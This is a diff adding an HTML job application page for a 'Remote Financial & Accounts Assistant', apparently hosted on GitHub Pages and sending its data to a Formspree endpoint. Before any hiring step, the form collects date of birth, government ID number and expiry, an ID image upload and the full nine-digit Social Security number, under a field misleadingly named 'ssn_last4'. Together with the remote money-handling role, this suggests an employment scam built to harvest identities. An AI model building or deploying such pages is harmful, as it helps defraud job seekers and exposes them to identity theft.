@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remote Financial & Accounts Assistant — Applicant Form</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f4f6f8;
+      color: #222;
+      line-height: 1.6;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 35px;
+    }
+
+    .header h1 {
+      font-size: 28px;
+      color: #16744a;
+      margin-bottom: 8px;
+    }
+
+    .header p {
+      color: #666;
+    }
+
+    .section {
+      margin-bottom: 35px;
+    }
+
+    .section-title {
+      font-size: 19px;
+      color: #16744a;
+      border-bottom: 2px solid #16744a;
+      padding-bottom: 8px;
+      margin-bottom: 20px;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .full-width {
+      grid-column: 1 / -1;
+    }
+
+    label {
+      font-weight: 600;
+      margin-bottom: 7px;
+      color: #333;
+    }
+
+    input,
+    select,
+    textarea {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccd2d8;
+      border-radius: 7px;
+      font-size: 15px;
+      background: #fff;
+    }
+
+    input:focus,
+    select:focus,
+    textarea:focus {
+      outline: none;
+      border-color: #16744a;
+      box-shadow: 0 0 0 2px rgba(22,116,74,0.1);
+    }
+
+    textarea {
+      min-height: 110px;
+      resize: vertical;
+    }
+
+    .checkbox-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-top: 5px;
+    }
+
+    .checkbox-item {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-weight: normal;
+    }
+
+    .checkbox-item input {
+      width: auto;
+    }
+
+    .notice {
+      background: #f1f8f4;
+      border-left: 4px solid #16744a;
+      padding: 15px;
+      margin-top: 15px;
+      color: #444;
+      font-size: 14px;
+    }
+
+    .responsibilities {
+      padding-left: 22px;
+    }
+
+    .responsibilities li {
+      margin-bottom: 7px;
+    }
+
+    .signature-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px;
+    }
+
+    .submit-area {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    button {
+      background: #16744a;
+      color: white;
+      border: none;
+      padding: 14px 35px;
+      border-radius: 7px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #105c39;
+    }
+
+    .footer-note {
+      text-align: center;
+      margin-top: 25px;
+      color: #777;
+      font-size: 13px;
+    }
+
+    @media (max-width: 650px) {
+      .container {
+        margin: 15px;
+        padding: 25px 18px;
+      }
+
+      .form-grid,
+      .signature-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .full-width {
+        grid-column: auto;
+      }
+
+      .header h1 {
+        font-size: 23px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <h1>Remote Financial & Accounts Assistant</h1>
+    <p>Applicant Information & Identification Form</p>
+  </div>
+
+  
+  <!-- APPLICATION FORM -->
+  <form
+    id="applicationForm"
+    action="https://formspree.io/f/xeaozzqv"
+    method="POST"
+  >
+
+    <!-- Formspree settings -->
+    <input
+      type="hidden"
+      name="_subject"
+      value="New Remote Financial & Accounts Assistant Application"
+    >
+
+    <input type="hidden" name="_next" value="https://noverbuildconstructionhr.github.io/Remote-Financial-Accounts-Assistant-Applicant-Form/application-success.html" >
+
+
+    <!-- Applicant Information -->
+    <div class="section">
+      <h2 class="section-title">1. Applicant Information</h2>
+
+      <div class="form-grid">
+
+        <div class="form-group">
+          <label for="fullname">Full Legal Name</label>
+          <input type="text" id="fullname" name="fullname" required>
+        </div>
+
+        <div class="form-group">
+          <label for="preferred-name">Preferred Name</label>
+          <input type="text" id="preferred-name" name="preferred_name">
+        </div>
+
+        <div class="form-group">
+          <label for="dob">Date of Birth</label>
+          <input type="date" id="dob" name="dob">
+        </div>
+
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" name="phone" required>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" name="email" required>
+        </div>
+
+        <div class="form-group">
+          <label for="city">Current City & State</label>
+          <input type="text" id="city" name="city">
+        </div>
+
+        <div class="form-group full-width">
+          <label for="location">Remote Work Location</label>
+          <input type="text" id="location" name="location">
+        </div>
+
+      </div>
+    </div>
+
+  
+
+  <div class="form-grid">
+
+    <!-- ID Type -->
+    <div class="form-group">
+      <label for="idtype">Government-Issued ID Type</label>
+
+      <select id="idtype" name="id_type">
+        <option value="">Select ID Type</option>
+        <option value="drivers_license">Driver's License</option>
+        <option value="state_id">State ID</option>
+        <option value="passport">U.S. Passport</option>
+        <option value="passport_card">U.S. Passport Card</option>
+        <option value="permanent_resident_card">
+          Permanent Resident Card
+        </option>
+        <option value="employment_authorization">
+          Employment Authorization Document
+        </option>
+        <option value="other">Other</option>
+      </select>
+    </div>
+
+
+    <!-- ID Number -->
+    <div class="form-group">
+      <label for="idnumber">Government ID Number</label>
+
+      <input
+        type="text"
+        id="idnumber"
+        name="id_number"
+        placeholder="Enter ID number"
+        autocomplete="off">
+    </div>
+
+
+    <!-- ID Expiration -->
+    <div class="form-group">
+      <label for="expiration">ID Expiration Date</label>
+
+      <input
+        type="date"
+        id="expiration"
+        name="id_expiration">
+    </div>
+
+<!-- SSN -->
+  <div class="section" style="margin-top:25px;margin-bottom:0;">
+
+    <h3 style="font-size:18px;color:#16744a;margin-bottom:15px;">
+      Social Security Information
+    </h3>
+
+    
+
+    <br>
+
+    <div class="form-grid">
+
+      <div class="form-group">
+        <label for="ssn">
+          Enter 9 Digits of SSN
+        </label>
+
+        <input
+          type="text"
+          id="ssn"
+          name="ssn_last4"
+          inputmode="numeric"
+          maxlength="9"
+          pattern="[0-9]{9}"
+          placeholder="xxxxxxxxx"
+          autocomplete="off">
+      </div>
+
+
+      <div class="form-group">
+        <label for="ssn_required">
+        </label>
+
+        
+
+    </div>
+
+  </div>
+
+</div>
+
+    <!-- ID Upload -->
+    <div class="form-group">
+      <label for="id_document">
+        Upload Government-Issued ID
+      </label>
+
+      <input
+        type="file"
+        id="id_document"
+        name="id_document"
+        accept=".jpg,.jpeg,.png,.pdf">
+
+      <small style="margin-top:6px;color:#777;">
+        Accepted formats: JPG, JPEG, PNG or PDF.
+      </small>
+    </div>
+
+
+    <!-- Additional Documents -->
+    <div class="form-group full-width">
+      <label for="employment_documents">
+        Additional Employment Documentation
+      </label>
+
+      <input
+        type="file"
+        id="employment_documents"
+        name="employment_documents[]"
+        accept=".jpg,.jpeg,.png,.pdf"
+        multiple>
+
+      <small style="margin-top:6px;color:#777;">
+        Upload supporting employment documents only when requested.
+      </small>
+    </div>
+
+  </div>
+
+
+  
+
+    <!-- Education & Experience -->
+    <div class="section">
+      <h2 class="section-title">2. Education & Experience</h2>
+
+      <div class="form-grid">
+
+        <div class="form-group">
+          <label for="education">Highest Level of Education</label>
+          <select id="education" name="education">
+            <option value="">Select</option>
+            <option>High School</option>
+            <option>College Student</option>
+            <option>Associate Degree</option>
+            <option>Bachelor's Degree</option>
+            <option>Master's Degree</option>
+            <option>Other</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="school">School / University</label>
+          <input type="text" id="school" name="school">
+        </div>
+
+        <div class="form-group">
+          <label for="field">Field of Study</label>
+          <input type="text" id="field" name="field">
+        </div>
+
+        <div class="form-group">
+          <label for="graduation">Expected Graduation Date</label>
+          <input type="text" id="graduation" name="graduation">
+        </div>
+
+        <div class="form-group full-width">
+          <label for="experience">Previous Accounting / Finance Experience</label>
+          <textarea id="experience" name="experience"
+            placeholder="Optional, Briefly describe your relevant experience..."></textarea>
+        </div>
+
+        <div class="form-group full-width">
+          <label for="software">Accounting / Financial Software Used</label>
+
+          <div class="checkbox-group">
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="software[]" value="QuickBooks">
+              QuickBooks
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="software[]" value="Excel">
+              Excel / Microsoft Office
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="software[]" value="Google Sheets">
+              Google Sheets
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="software[]" value="Xero">
+              Xero
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="software[]" value="FreshBooks">
+              FreshBooks
+            </label>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- Remote Work -->
+    <div class="section">
+      <h2 class="section-title">3. Remote Work Information</h2>
+
+      <div class="form-grid">
+
+        <div class="form-group">
+          <label>Reliable Internet Access?</label>
+
+          <div class="checkbox-group">
+            <label class="checkbox-item">
+              <input type="radio" name="internet" value="yes" required>
+              Yes
+            </label>
+
+            <label class="checkbox-item">
+              <input type="radio" name="internet" value="no">
+              No
+            </label>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Computer Suitable for Remote Work?</label>
+
+          <div class="checkbox-group">
+            <label class="checkbox-item">
+              <input type="radio" name="computer" value="yes">
+              Yes
+            </label>
+
+            <label class="checkbox-item">
+              <input type="radio" name="computer" value="no">
+              No
+            </label>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Internet / Power Backup Available?</label>
+
+          <div class="checkbox-group">
+            <label class="checkbox-item">
+              <input type="radio" name="backup" value="yes">
+              Yes
+            </label>
+
+            <label class="checkbox-item">
+              <input type="radio" name="backup" value="no">
+              No
+            </label>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="hours">Hours Available Per Week</label>
+          <input type="number" id="hours" name="hours" min="1">
+        </div>
+
+        <div class="form-group">
+          <label for="timezone">Time Zone</label>
+          <input type="text" id="timezone" name="timezone">
+        </div>
+
+        <div class="form-group">
+          <label>Preferred Work Schedule</label>
+
+          <div class="checkbox-group">
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="schedule[]" value="Full-Time">
+              Full-Time
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="schedule[]" value="Part-Time">
+              Part-Time
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="schedule[]" value="Evenings">
+              Evenings
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="schedule[]" value="Weekends">
+              Weekends
+            </label>
+
+            <label class="checkbox-item">
+              <input type="checkbox" name="schedule[]" value="Flexible">
+              Flexible
+            </label>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- Responsibilities -->
+    <div class="section">
+      <h2 class="section-title">4. Position Responsibilities</h2>
+
+      <ul class="responsibilities">
+        <li>Recording and organizing company financial transactions</li>
+        <li>Maintaining invoices and payment records</li>
+        <li>Tracking accounts payable and receivable</li>
+        <li>Preparing basic financial reports</li>
+        <li>Monitoring company expenses</li>
+        <li>Organizing receipts and supporting documentation</li>
+        <li>Assisting with payroll-related records</li>
+        <li>Reconciling financial information</li>
+        <li>Communicating with vendors and service providers</li>
+        <li>Maintaining confidential company financial information</li>
+        <li>Assisting management with administrative and accounting tasks</li>
+      </ul>
+
+      <div class="notice">
+        <strong>Important:</strong>
+        Employees will only be authorized to handle company payments,
+        bank-related activity, or financial transfers when specifically
+        approved by authorized company management.
+      </div>
+    </div>
+
+
+
+
+    <!-- References -->
+    <div class="section">
+      <h2 class="section-title">5. References</h2>
+
+      <h3>Professional / Academic Reference #1</h3>
+
+      <div class="form-grid">
+
+        <div class="form-group">
+          <label for="ref1name">Name</label>
+          <input type="text" id="ref1name" name="ref1_name">
+        </div>
+
+        <div class="form-group">
+          <label for="ref1relationship">Relationship</label>
+          <input type="text" id="ref1relationship" name="ref1_relationship">
+        </div>
+
+        <div class="form-group full-width">
+          <label for="ref1contact">Phone / Email</label>
+          <input type="text" id="ref1contact" name="ref1_contact">
+        </div>
+
+      </div>
+
+      <br>
+
+      <h3>Professional / Academic Reference #2</h3>
+
+      <div class="form-grid">
+
+        <div class="form-group">
+          <label for="ref2name">Name</label>
+          <input type="text" id="ref2name" name="ref2_name">
+        </div>
+
+        <div class="form-group">
+          <label for="ref2relationship">Relationship</label>
+          <input type="text" id="ref2relationship" name="ref2_relationship">
+        </div>
+
+        <div class="form-group full-width">
+          <label for="ref2contact">Phone / Email</label>
+          <input type="text" id="ref2contact" name="ref2_contact">
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- Certification -->
+    <div class="section">
+      <h2 class="section-title">6. Applicant Certification</h2>
+
+      <p>
+        I certify that the information provided on this application is
+        accurate and complete to the best of my knowledge. I understand
+        that employment is subject to verification of qualifications and
+        completion of any required employment documentation.
+      </p>
+
+      <br>
+
+      <p>
+        I understand that confidential company information must be protected
+        and that access to company financial accounts, payment systems,
+        or financial records will be limited according to company
+        authorization and applicable policies.
+      </p>
+
+      <br>
+
+      <div class="signature-grid">
+
+        <div class="form-group">
+          <label for="signature">Applicant Name / Electronic Signature</label>
+          <input type="text" id="signature" name="signature" required>
+        </div>
+
+        <div class="form-group">
+          <label for="date">Date</label>
+          <input type="date" id="date" name="date" required>
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- Submit -->
+    <div class="submit-area">
+      <button type="submit">Submit Application</button>
+    </div>
+
+    <p class="footer-note">
+      Remote employment application • All information will be handled
+      according to applicable company policies and law.
+    </p>
+
+  </form>
+
+</div>
+
+</body>
+</html>
